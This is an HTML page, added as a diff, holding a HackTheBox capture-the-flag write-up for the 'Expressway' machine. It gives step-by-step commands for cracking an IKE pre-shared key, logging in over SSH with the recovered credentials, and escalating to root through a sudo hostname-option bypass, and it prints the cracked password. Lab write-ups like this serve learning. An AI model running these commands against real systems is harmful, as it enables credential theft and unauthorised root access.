@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Expressway (GACHA Season 9) · Will Seligman</title>
+<link rel="stylesheet" href="/assets/style.css">
+</head>
+<body>
+<button id="menu-toggle" aria-label="Toggle navigation">&#9776; Menu</button>
+<div class="layout">
+<aside class="sidebar" id="sidebar">
+  <a class="brand" href="/index.html">
+    <span class="brand-flag">&#127988;</span>
+    <span class="brand-text"><strong>Will Seligman</strong><small>Cybersecurity Notes & CTF Writeups</small></span>
+  </a>
+  <nav class="nav" id="nav-root" data-current="htb/challenges/expressway.html"></nav>
+</aside>
+<main class="content">
+  <article class="doc">
+  <div class="breadcrumb"><a href="/htb/index.html">HackTheBox</a> &rsaquo; <a href="/htb/challenges/index.html">Completed Challenges</a></div>
+  <h1 id="expressway-gacha-season-9">Expressway (GACHA Season 9)</h1>
+<pre><code class="language-text">1. IKE Pre-Shared Key Cracking
+
+   * Get the aggressive mode handshake and save the hash:
+
+   1     ike-scan -A --id=vpn --pskcrack=psk.txt 10.10.11.87
+   * Crack the hash using a wordlist:
+   1     psk-crack -d /usr/share/wordlists/rockyou.txt psk.txt
+      This revealed the PSK freakingrockstarontheroad and the username ike.
+
+  2. Initial SSH Access
+
+   * Log in as the ike user using the cracked password:
+
+   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh &amp;&amp; setsid ssh -o 
+     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 &quot;whoami&quot;
+
+  3. User Flag
+
+   * Read the user flag from the home directory:
+
+   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh &amp;&amp; setsid ssh -o 
+     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 &quot;cat 
+     /home/ike/user.txt&quot;
+
+  4. Privilege Escalation (Sudo Hostname Bypass)
+
+   * Find the internal hostname by examining the squid logs:
+
+   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh &amp;&amp; setsid ssh -o 
+     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 &quot;cat 
+     /var/log/squid/access.log.1&quot;
+      This revealed the hostname offramp.expressway.htb.
+   * Use the discovered hostname to bypass the sudo restriction and get a root shell:
+
+   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh &amp;&amp; setsid ssh -o 
+     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 &quot;sudo -A 
+     -h offramp.expressway.htb /bin/bash&quot;
+
+  5. Root Flag
+
+   * Read the root flag from the /root directory:
+
+   1     export SSH_ASKPASS=/mnt/tmp/HTB/expressway/askpass.sh &amp;&amp; setsid ssh -o 
+     StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ike@10.10.11.87 &quot;sudo -A 
+     -h offramp.expressway.htb cat /root/root.txt&quot;
+
+</code></pre>
+  </article>
+  <footer class="foot">Notes by Will Seligman · built from Notion</footer>
+</main>
+</div>
+<script src="/assets/nav.js" defer></script>
+<script>
+document.getElementById('menu-toggle').addEventListener('click',function(){
+  document.getElementById('sidebar').classList.toggle('open');
+});
+</script>
+</body>
+</html>
